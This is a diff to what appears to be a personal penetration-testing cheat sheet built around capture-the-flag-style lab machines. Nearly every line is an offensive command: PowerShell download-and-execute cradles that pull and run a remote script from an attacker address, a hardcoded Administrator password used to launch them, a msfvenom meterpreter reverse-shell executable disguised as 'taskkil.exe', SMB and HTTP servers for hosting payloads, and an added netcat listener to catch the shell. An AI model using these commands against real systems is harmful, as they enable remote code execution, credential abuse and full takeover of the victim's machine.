@@ -101,7 +101,8 @@ cmd%20/c%20c:\Windows\SysNative\WindowsPowershell\v1.0\powershell%20IEX(New-Obje
 $pass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('Administrator',$pass)
 start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.73/rev1.txt')" -credential $cred
-Invoke-Command -Credential $cred -ScriptBlock {"whoami"}
+# run hostname
+Invoke-Command -Computer ARKHAM -Credential $cred -ScriptBlock { whoami }
 
 #powershell suite runas 
   paste following at the bottom of the script(see bart video @ 55:36):
@@ -119,7 +120,7 @@ tcpdump -i tun0 icmp
 python -m SimpleHTTPServer 80
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=51251 -f exe -o taskkil.exe
 impacket-smbserver files `pwd`
-
+rlwrap nc -lvnp 51251
 
 USEFULL FRAMEWORKS
 GIT
